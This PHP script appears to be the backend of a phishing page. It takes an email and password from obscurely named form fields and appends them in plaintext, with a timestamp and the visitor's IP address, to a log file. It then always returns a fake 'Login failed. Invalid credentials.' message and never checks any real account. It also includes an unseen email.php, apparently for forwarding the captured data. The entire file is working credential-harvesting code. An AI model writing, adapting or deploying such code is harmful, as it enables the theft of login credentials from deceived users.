<?php
require_once 'email.php';

// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_VALIDATE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Define response function
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Validate email and password
if (!empty($email) && !empty($password)) {
    try {
        // Ensure logs folder exists
        $logsFolder = __DIR__ . '/logs';
        if (!is_dir($logsFolder)) {
            $created = mkdir($logsFolder, 0755, true);
            if (!$created) {
                error_log("Failed to create logs folder: {$logsFolder}");
                sendJsonResponse(false, "Unable to log information due to a server error.");
            }
        }

        // Save log data to file
        $logFile = "{$logsFolder}/login_attempts.txt";
        $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
        if (file_put_contents($logFile, $logData, FILE_APPEND) === false) {
            error_log("Failed to write log data to file: {$logFile}");
            sendJsonResponse(false, "Unable to log information due to a server error.");
        }

        // Provide a generic failed login response
        sendJsonResponse(false, "Login failed. Invalid credentials.");
    } catch (Exception $e) {
        error_log("Log write exception: " . $e->getMessage());
        sendJsonResponse(false, "An error occurred while logging the attempt.");
    }
} else {
    // Handle missing email or password
    sendJsonResponse(false, "Email or Password missing.");
}
?>
